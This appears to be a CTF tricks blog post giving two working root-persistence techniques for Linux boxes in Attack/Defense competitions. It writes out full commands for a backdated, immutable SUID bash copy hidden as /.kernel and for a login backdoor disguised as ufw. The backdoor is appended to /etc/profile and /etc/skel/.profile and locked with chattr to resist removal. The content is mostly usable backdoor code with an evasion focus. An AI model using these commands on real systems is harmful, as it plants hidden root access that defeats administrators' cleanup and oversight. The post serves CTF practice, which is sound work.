---
title: "Root persistence for Attack/Defense CTFs"
description: "Two root-persistence tricks for Attack/Defense CTFs: a hidden SUID bash, and a login backdoor that survives new users."
date: 2025-09-05T11:14:36-04:00
updated: 2026-07-18
draft: false
categories: ["tricks"]
tags: ["attack", "defense", "redteam", "persistence", "priv-esc"]
---

Attack/Defense CTFs hand every team the same box. Once you have root, you want a way back in that survives a patch or a password reset. Both snippets assume you are already root.

## Hidden SUID bash

A root-owned copy of bash with the SUID bit set. Any user can run it to get a root shell. It is backdated to blend into old files and made immutable so a cleanup script can't remove it.

```bash
cp /bin/bash /.kernel                       # root-owned copy, innocuous name
chmod +s /.kernel                           # SUID: runs as its owner (root)
touch -d "2004-05-04 00:00:00" /.kernel     # backdate to blend in
chattr +i /.kernel                          # immutable, even root can't delete it
```

Trigger it with `/.kernel -p`. Bash drops elevated privileges on startup unless you pass `-p`.

## Login backdoor

Runs a payload on every login and for every newly created user, disguised as `ufw`. The profile files and the binary are locked immutable.

```bash
echo "/usr/bin/ufw &" >> /etc/profile        # runs on every interactive login
echo "/usr/bin/ufw &" >> /etc/skel/.profile  # and for every new user
chmod +s /usr/bin/ufw                         # SUID root
chattr +i /usr/bin/ufw /etc/profile /etc/skel/.profile
```

To clean up afterward, drop immutability first: `chattr -i <file>`, then revert each change.
